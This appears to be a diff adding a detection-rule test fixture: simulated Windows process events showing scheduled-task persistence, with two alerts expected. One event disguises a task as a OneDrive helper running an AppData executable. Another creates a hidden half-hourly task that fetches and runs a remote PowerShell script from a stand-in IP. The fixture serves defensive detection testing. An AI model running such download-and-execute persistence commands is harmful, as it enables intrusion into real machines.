@@ -1,0 +1,26 @@
+{
+  "description": "Persistence via scheduled tasks pointing at AppData and an inline PowerShell action",
+  "expected_alerts": 2,
+  "events": [
+    {
+      "@timestamp": "2026-09-14T10:00:00Z",
+      "EventID": 1,
+      "Computer": "WS-MKT-007",
+      "User": "CORP\\abrown",
+      "Image": "C:\\Windows\\System32\\schtasks.exe",
+      "CommandLine": "schtasks.exe /create /sc onlogon /tn \"OneDrive Sync Helper\" /tr \"C:\\Users\\abrown\\AppData\\Roaming\\odsync.exe\" /f",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "cmd.exe"
+    },
+    {
+      "@timestamp": "2026-09-14T10:05:00Z",
+      "EventID": 1,
+      "Computer": "WS-MKT-007",
+      "User": "CORP\\abrown",
+      "Image": "C:\\Windows\\System32\\schtasks.exe",
+      "CommandLine": "schtasks /create /sc minute /mo 30 /tn Updater /tr \"powershell -w hidden -c iex(iwr http://198.51.100.23/a.ps1)\"",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "cmd.exe"
+    }
+  ]
+}
